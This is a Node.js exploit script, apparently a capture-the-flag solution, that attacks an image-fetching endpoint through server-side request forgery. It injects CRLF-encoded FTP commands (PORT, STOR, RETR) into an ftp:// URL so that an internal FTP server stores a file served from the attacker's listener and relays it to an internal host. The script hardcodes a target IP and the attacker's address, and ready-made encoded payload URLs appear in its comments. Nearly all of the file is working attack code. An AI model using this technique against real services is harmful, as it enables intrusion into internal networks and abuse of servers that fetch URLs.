let net = require("net");
let fs = require("fs");

let requests = require("requests");

// Start the server then visit
//
// http://localhost:8080/api/image?url=ftp%3A%2F%2Fanonymous%3A%40ftp%3A21%2Ffoo%250D%250APORT%2520192%252C168%252C86%252C17%252C8%252C0%250D%250ASTOR%2520%252Fzach.pwn%250D%250APORT%2520192%252C168%252C86%252C17%252C8%252C0%250D%250ASTOR%2520%252Fzach.pwn%250D%250A
//
// That will save the file
// Then visit
// http://localhost:8080/api/image?url=ftp%3A%2F%2Fanonymous%3A%40ftp%3A21%2Ffoo%250D%250APORT%2520172%252C32%252C56%252C72%252C61%252C56%250D%250ARETR%2520%252Fzach.pwn%250D%250APORT%2520172%252C32%252C56%252C72%252C61%252C56%250D%250ARETR%2520%252Fzach.pwn%250D%250APORT%2520172%252C32%252C56%252C72%252C61%252C56%250D%250ARETR%2520%252Fzach.pwn%250D%250A

const msg = fs.readFileSync("./req2.http");

const target = "149.28.10.227"
const me = "67,171,68,180,8,0"
const rabbit = "172,32,56,72,61,56"

let payload1 = encodeURIComponent(`\r
PORT ${rabbit}\r
RETR /zach.pwn\r
PORT ${rabbit}\r
RETR /zach.pwn\r
PORT ${rabbit}\r
RETR /zach.pwn\r
`)
let retrFtp = encodeURIComponent(`ftp://anonymous:@ftp:21/foo${payload1}`);

let payload2 = encodeURIComponent(`\r
PORT ${me}\r
PORT ${me}\r
STOR /zach.pwn\r
PORT ${me}\r
STOR /zach.pwn\r
PORT ${me}\r
STOR /zach.pwn\r
`)
let storFtp = encodeURIComponent(`ftp://anonymous:@ftp:21/foo${payload2}`);

let retrUri = `http://${target}/api/image?url=${retrFtp}`;
let storUri = `http://${target}/api/image?url=${storFtp}`;

const server = net.createServer((socket) => {
    console.log("New connection");
    socket.on("data", (data) => console.log(data));
    socket.end(msg);
    console.log("Finished sending");
    socket.on("error", (err) => console.error(err));
});

server.on("error", (err) => console.error(err));

server.listen(2048, async () => {
    console.log("making requests");
    try {
        requests(storUri, (err, data) => console.log(err, data));
        await new Promise((resolve) => setTimeout(resolve, 5000));
        requests(retrUri, (err, data) => console.log(err, data));
        console.log("Done");
    } catch (e) {
        console.error(e);
    }
});



